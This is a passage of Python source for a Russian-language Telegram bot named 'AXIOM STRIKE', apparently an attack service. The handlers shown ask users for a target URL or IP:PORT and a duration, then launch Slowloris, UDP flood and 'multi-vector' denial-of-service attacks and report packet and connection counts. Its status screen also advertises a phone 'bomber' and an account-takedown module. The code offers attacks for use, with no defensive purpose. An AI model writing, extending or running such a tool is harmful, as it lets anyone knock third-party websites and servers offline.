            "🐌 **SLOWLORIS**\n\n"
            "Введите URL цели:\n"
            "📝 Пример: https://example.com"
        )

    async def process_ddos_ddos_duration(self, message: types.Message, state: FSMContext):
        try:
            duration = int(message.text.strip())
            if duration < 60 or duration > 600:
                await message.answer("❌ Введите число от 60 до 600!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        url = data.get('url')
        method = data.get('method', 'slowloris')
        ip = data.get('ip')
        port = data.get('port')
        await state.clear()

        status_msg = await message.answer(
            f"💀 **{method.upper()} запущена!**\n"
            f"⏳ Идёт атака..."
        )

        if method == 'slowloris':
            stats = await self.ddos_engine.slowloris(url, duration, None)
            result_text = (
                f"🐌 **SLOWLORIS завершена!**\n\n"
                f"🌐 URL: {url}\n"
                f"📊 Соединений: {stats['connections']}\n"
                f"🔄 Активных: {stats['active']}\n"
                f"⏱ Длительность: {duration}с"
            )
        elif method == 'udp':
            stats = await self.ddos_engine.udp_flood(ip, port, duration, None)
            result_text = (
                f"📡 **UDP FLOOD завершена!**\n\n"
                f"🌐 IP: {ip}:{port}\n"
                f"📦 Пакетов: {stats['packets']}\n"
                f"💾 Байт: {stats['bytes']}\n"
                f"⏱ Длительность: {duration}с"
            )
        elif method == 'multi':
            stats = await self.ddos_engine.multi_vector(url, duration, None)
            result_text = (
                f"💀 **MULTI-VECTOR завершена!**\n\n"
                f"🌐 URL: {url}\n"
                f"📊 HTTP запросов: {stats['http']['requests']}\n"
                f"🌐 HTTP успешно: {stats['http']['success']}\n"
                f"🐌 Slowloris соединений: {stats['slowloris']['connections']}\n"
                f"📦 UDP пакетов: {stats['udp']['packets']}\n"
                f"💾 UDP байт: {stats['udp']['bytes']}\n"
                f"⏱ Длительность: {duration}с"
            )
        else:
            result_text = "❌ Неизвестный метод"

        await status_msg.edit_text(result_text, reply_markup=self.ddos_keyboard())

    async def handle_udp_flood(self, message: types.Message, state: FSMContext):
        await state.set_state(DDoSStates.waiting_for_ip)
        await message.answer(
            "📡 **UDP FLOOD**\n\n"
            "Введите IP:PORT цели:\n"
            "📝 Пример: 192.168.1.1:80"
        )

    async def process_ddos_ip(self, message: types.Message, state: FSMContext):
        try:
            ip, port = message.text.strip().split(':')
            port = int(port)
        except:
            await message.answer("❌ Введите в формате IP:PORT!")
            return

        await state.update_data(ip=ip, port=port, method='udp')
        await state.set_state(DDoSStates.waiting_for_ddos_duration)
        await message.answer("⏱ Введите длительность (30-120 сек):")

    async def handle_multi_vector(self, message: types.Message, state: FSMContext):
        await state.set_state(DDoSStates.waiting_for_url)
        await state.update_data(method='multi')
        await message.answer(
            "💀 **MULTI-VECTOR**\n\n"
            "Введите URL цели:\n"
            "📝 Пример: https://example.com"
        )

    # ========== СТАТИСТИКА И НАСТРОЙКИ ==========
    async def handle_stats(self, message: types.Message):
        await message.answer(
            "📊 **СТАТИСТИКА AXIOM STRIKE**\n\n"
            f"📅 Дата: {datetime.now().strftime('%d.%m.%Y %H:%M')}\n"
            f"📱 Бомбер: активен\n"
            f"💣 DDoS: активен\n"
            f"💀 Снос: активен\n"
            f"⚡ Статус: ONLINE\n"
            f"🔥 Версия: 4.0.0",
            reply_markup=self.main_keyboard()
        )

    async def handle_settings(self, message: types.Message):
        await message.answer(
            "⚙️ **НАСТРОЙКИ**\n\n"
            "🔹 Язык: Русский\n"
            "🔹 Режим: Боевой\n"
            "🔹 Уведомления: Включены\n"
            "🔹 Логирование: Включено\n\n"
            "📌 Для изменения настроек обратитесь к администратору.",
            reply_markup=self.main_keyboard()
        )

    # ========== ЗАПУСК БОТА ==========
    async def start(self):
        logger.info("🔥 Запуск AXIOM STRIKE BOT...")
        try:
            await self.bot.get_me()
            logger.info("✅ Подключение успешно!")
            await self.dp.start_polling(self.bot)
        except Exception as e:
            logger.error(f"❌ Ошибка: {e}")
            raise


# ===================== ЗАПУСК =====================
if __name__ == "__main__":
    import re
    if API_TOKEN == "ВСТАВИТЬ_ТОКЕН_СЮДА":
        print("❌ Ошибка: Не установлен токен бота!")
        exit(1)

    try:
        bot = AxiomStrikeBot(token=API_TOKEN)
        asyncio.run(bot.start())
    except KeyboardInterrupt:
        print("\n⏹️ Бот остановлен")
    except Exception as e:
        print(f"❌ Ошибка: {e}")
        logger.error(f"Критическая ошибка: {e}", exc_info=True)
